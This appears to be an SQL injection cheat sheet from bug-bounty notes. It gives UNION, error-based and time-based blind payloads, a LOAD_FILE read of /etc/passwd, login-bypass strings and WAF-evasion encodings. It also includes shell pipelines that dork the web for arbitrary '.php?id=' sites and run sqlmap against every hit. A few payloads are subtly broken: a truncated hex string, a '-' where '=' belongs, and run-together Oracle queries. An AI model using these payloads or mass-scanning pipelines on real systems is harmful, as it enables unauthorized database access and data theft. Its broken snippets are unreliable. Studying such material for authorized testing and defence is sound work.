### Methods To Find SQLi

1. Using BurpSuit:
    ```
    1. Capture the request using burpsuite.
    2. Send the request to burp scanner.
    3. Proceed with active scan.
    4. Once the scan is finished, look for SQL vulnerability that has been detected.
    5. Manually try SQL injection payloads.
    6. Use SQLMAP to speed up the process.
    ```

    

2. Error generation with untrusted input or special characters :
    ```
    1. Submit single quote character ' & look for errors.
    2. Submit SQL specific query.
    3. Submit Boolean conditions such as or 1=1 and or 1=0, and looking application's response.
    4. Submit certain payloads that results in time delay.
    ```

    You can test a single boolean condition and trigger a database error if the condition is true.

    | Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual` |
    | :--------- | ------------------------------------------------------------ |
    | Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
    | PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END` |
    | MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

3. Finding total number of columns with order by or group by or having :
    ```sql
    Submit a series of ORDER BY clause such as 
    
    ' ORDER BY 1 --
    ' ORDER BY 2 --
    ' ORDER BY 3 --
    
    and incrementing specified column index until an error occurs.
    ```

4. Finding vulnerable columns with union operator :
    ```sql
    Submit a series of UNION SELECT payloads.
    
    ' UNION SELECT NULL --
    ' UNION SELECT NULL, NULL --
    ' UNION SELECT NULL, NULL, NULL --
    
    (Using NULL maximizes the probability that the payload will succeed. NULL can be converted to every commonly used data type.)
    ```

5. Extracting basic information like `database()`, `version()`, `user()`, `UUID() `with `concat()` or `group_concat()`

    1. **Database version**

    You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

    | Oracle     | `SELECT banner FROM v$versionSELECT version FROM v$instance` |
    | :--------- | ------------------------------------------------------------ |
    | Microsoft  | `SELECT @@version`                                           |
    | PostgreSQL | `SELECT version()`                                           |
    | MySQL      | `SELECT @@version`                                           |

    2. **Database contents**

    You can list the tables that exist in the database, and the columns that those tables contain.

    | Oracle     | `SELECT * FROM all_tablesSELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
    | :--------- | ------------------------------------------------------------ |
    | Microsoft  | `SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
    | PostgreSQL | `SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
    | MySQL      | `SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

    3. Shows version, user and database name:

    ```sql
    ' AND 1=2 UNION ALL SELECT concat_ws(0x3a,version(),user(),database())
    ```

    4. Using group_concat() function, used to concat all the rows of the returned results:

    ```sql
    ' union all select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=database()–
    ```

6. Accessing system files with load_file(). and advance exploitation afterwards :
    ```sql
    ' UNION ALL SELECT LOAD_FILE ('/ etc / passwd')
    ```

7. Bypassing WAF :

    1. Using Null byte before SQL query.

    ```sql
    %00' UNION SELECT password FROM Users WHERE username-'xyz'--
    ```

    2. Using SQL inline comment sequence.

    ```sql
    '/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/username/**/LIKE/**/'xyz'--
    ```

    3. URL encoding

    ```
    for example :
    / URL encoded to %2f
    * URL encoded to %2a
    
    Can also use double encoding, if single encoding doesn't works. Use hex encoding if the rest doesn't work.
    ```

    4. Changing Cases (uppercase/lowercase)

    For more step wise detailed methods, go through the link below.

    https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF

    5. Use SQLMAP tamper scripts. It helps bypass WAF/IDS/IPS.

        - Use Atlas. It helps suggesting tamper scripts for SQLMAP. https://github.com/m4ll0k/Atlas
        - JHaddix post on SQLMAP tamper scripts https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423

        

8. Time Delays :

    You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

    | Oracle     | `dbms_pipe.receive_message(('a'),10)` |
    | :--------- | ------------------------------------- |
    | Microsoft  | `WAITFOR DELAY '0:0:10'`              |
    | PostgreSQL | `SELECT pg_sleep(10)`                 |
    | MySQL      | `SELECT sleep(10)`                    |

9. Conditional time delays:

    You can test a single boolean condition and trigger a time delay if the condition is true.

    | Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
    | :--------- | ------------------------------------------------------------ |
    | Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`            |
    | PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
    | MySQL      | `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')`               |

10. TIPS:

    - **Note - you can use either a `space` or `+ `in the injections**

```bash
sublist3r -d target | tee -a domains (you can use other tools like findomain, assetfinder, etc.)
cat domains | httpx | tee -a alive
cat alive | waybackurls | tee -a urls
gf sqli urls >> sqli
sqlmap -m sqli --dbs --batch
>>use tamper scripts
```

```
1. Use subdomain enumeration tools on the domain.
2. Gather all urls using hakcrawler, waybackurls, gau for the domain and subdomains.
3. You can use the same method described above in 2nd point.
4. Use Arjun to scan for the hidden params in the urls. 
5. Use --urls flag to include all urls.
6. Check the params as https://domain.com?<hiddenparam>=<value>
7. Send request to file and process it through sqlmap.
```

```bash
go-dork -q "inurl:.php?id=" -p 1 -silent | gf sqli | grep -iE "[0-999]" | unfurl format "https://%d%p?%q" | sort -u | nuclei -t sqli2.yaml -silent | grep -Po "(http[s]?:\/\/)?([^\/\s]+\/)(.*)" > sqli.txt | for line in $(cat sqli.txt);do sqlmap -u "$line" --banner ;done
```

> https://github.com/dwisiswant0/go-dork
> https://gist.githubusercontent.com/0x240x23elu/1cf0830ecc73656b79e011b471e8c167/raw/1ccd6dff3bc7fc91d31bc7eb0ba2808b1ef86e28/sqli2.yaml

> payloads:
> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

### Techniques

#### Filter evasion

Many applications use web application firewalls (WAF) to help protect against any kind of SQL injection vulnerability. The only problem is that WAFs only look for certain words, characters, or patterns, meaning certain special characters used in combination can be used to evade WAF filter protection.

For example, a very basic WAF may filter out specific SQL keywords such as `OR`, `SELECT`, `UNION` or `WHERE` to prevent them from being used in SQL injection attacks.

**Methods**

- **Capitalization** - If the WAF's filter, like the one described above, is implemented poorly, then there may be ways to evade it by using variations of the word being filtered out. The most straightforward example is where we can bypass the filter by capitalizing some letters in the keyword, like this:
    -  `Or`, `SeLeCt`, `UNioN` and `wHEre`.
- **URL Encoding** - In cases where the query forms part of a URL, URL encoding may be a viable option for evading the filter. For example `%55` is ‘U’ and `%53` is ‘S’. The WAF may not identify these encoded characters, and may send them to the server which decodes and processes them as the intended keywords.
- **Multi-line Comments** -  the use of multi-line comments, such as `“/*”` and `“*/”`, may cause the WAF filter to miss the keywords. MySQL will read the content between the two comment lines and execute it as SQL, whereas the DBMS may not flag it up.
    - `/*!%55NiOn*/ /*!%53eLEct*//**//*!12345UNION SELECT*//**//**//*!50000UNION SELECT*//**//**/UNION/**//*!50000SELECT*//**/`
    - The ‘+’ can be used to build an injection query without the use of quotes. `+union+distinct+select++union+distinctROW+select+`
- **Inline Comments** - To bypass certain filters, you can abuse the inline comment system within MySQL using #.
    - `+#uNiOn+#sEleCt`
- **Reverse Function** - To bypass a filter looking for certain strings, you can use the REVERSE function which will evaluate the correct way around at run time. However, when going through the filter, it will be seen as ‘noinu’ instead of ‘union’.
    - `REVERSE('noinu')+REVERSE('tceles')`
- **String Splitting** - You can split strings within the query to bypass various filters. MySQL will still execute them as keywords.
    - `un?+un/**/ion+se/**/lect+`

#### String Concatenation

An input field may restrict the usage of certain datatypes and/or words/punctuation. This can make the exploitation of SQL injection vulnerabilities a little bit more difficult. However, two functions can be used in conjunction to bypass filters such as these:`CHAR()` and `CONCAT()`.

**Syntax & examples**

- Within MySQL, you have to use quotation marks to input a string into a statement. However, with the use of string functions and encoding methods, you can get past this hurdle.
- To concatenate various strings inside a statement, the MySQL function `CONCAT` is available.
    - `CONCAT(str1, str2, str3)`
    - `SELECT CONCAT(login, email) FROM users`
- Another way to create strings without the use of quotes is the MySQL's `CHAR` function, which returns a character related to the integer passed to it. For example, `CHAR(75)` returns K. `CHAR` and `CONCAT` are often used together to create full sets of strings which bypass specific string filtering. This means you don't need quotation marks in the query.
    - `SELECT CONCAT(CHAR(77),CHAR(76),CHAR(75))`
    - This will select data from a database that is of ‘MLK’.
- Encoding methods are another way to manipulate strings. Strings can be encoded into their Hex values either by passing a hex value or using the `HEX()` function.
- For example, the string 'password' can be passed to an SQL statement like this: `SELECT 0x70617373776f726`

#### **Retrieve Hidden Data**

When retrieving items from a database via an SQL query, some results may be filtered with a restriction clause at the end of the of the query 

In a vulnerable parameter, we can insert `--` which is the SQL code for a comment. This will “comment out” the rest of the query, there for removing any restrictions placed on it.

**Example:**  

- https://insecure-website.com/products?category=Gifts
- Query made by this URL:`SELECT * FROM products WHERE category = 'Gifts' AND released = 1 `
- URL with added comment attack: https://insecure-website.com/products?category=Gifts'--
    - Resulted query:`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`
- Expanding URL to show everything 
    - https://insecure-website.com/products?category=Gifts'+OR+1=1--
    -  Resulted query: `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

#### **Subvert App Logic/Login Bypass**

When an application checks login credentials, it submits in a query, usually with the fields of a username and password. If the query returns with the user details, the login is successful.

One way of bypassing the login requirement of the password, is to comment out the part of the query, after the username

**Example**

- Original login query: 
    `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'` 
- Query with bypassed password field
    `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`



### SQL Injection Vulnerability Scanner Tool's :

- [SQLMap](https://github.com/sqlmapproject/sqlmap) – Automatic SQL Injection And Database Takeover Tool
- [jSQL Injection](https://github.com/ron190/jsql-injection) – Java Tool For Automatic SQL Database Injection
- [BBQSQL](https://github.com/Neohapsis/bbqsql) – A Blind SQL-Injection Exploitation Tool
- [NoSQLMap](https://github.com/codingo/NoSQLMap) – Automated NoSQL Database Pwnage
- [Whitewidow](https://www.kitploit.com/2017/05/whitewidow-sql-vulnerability-scanner.html) – SQL Vulnerability Scanner
- [DSSS](https://github.com/stamparm/DSSS) – Damn Small SQLi Scanner
- [explo](https://github.com/dtag-dev-sec/explo) – Human And Machine Readable Web Vulnerability Testing Format
- [Blind-Sql-Bitshifting](https://github.com/awnumar/blind-sql-bitshifting) – Blind SQL-Injection via Bitshifting
- [Leviathan](https://github.com/leviathan-framework/leviathan) – Wide Range Mass Audit Toolkit
- [Blisqy](https://github.com/JohnTroony/Blisqy) – Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB)

- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) - A PowerShell Toolkit for Attacking SQL Server

    - https://github.com/NetSPI/PowerUpSQL/wiki
    - https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet

- [**SQLninja**](http://sqlninja.sourceforge.net)

    - https://www.jedge.com/wordpress/sqlninja-sql-injection/
    - Great for evading IDS and uploading shells
    - Often times IDS will either recognize SQLmap OR SQLninja but not both
    - With SQLninja you must specify the vulnerable variable to inject.
    - Takes more to set up with manipulation of the config file.

- https://github.com/torque59/Nosql-Exploitation-Framework

- https://github.com/Charlie-belmer/nosqli

- https://github.com/FSecureLABS/N1QLMap

- [https://github.com/daffainfo/AllAboutBugBounty/blob/master/NoSQL%20Injection.md](https://github.com/daffainfo/AllAboutBugBounty/blob/master/NoSQL Injection.md)

- https://github.com/the-robot/sqliv

    